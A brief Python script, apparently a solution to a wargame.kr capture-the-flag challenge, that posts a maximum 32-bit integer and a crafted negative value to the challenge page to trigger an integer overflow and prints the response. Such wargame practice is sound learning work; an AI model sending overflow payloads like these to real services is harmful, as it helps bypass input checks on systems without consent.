# -*- coding : utf-8 -*-
import requests

data = {'d1': 2147483647, 'd2': -2147483644}
url = 'http://wargame.kr:8080/php_c/'

r = requests.post(url, data=data)
print(r.text[0:40])
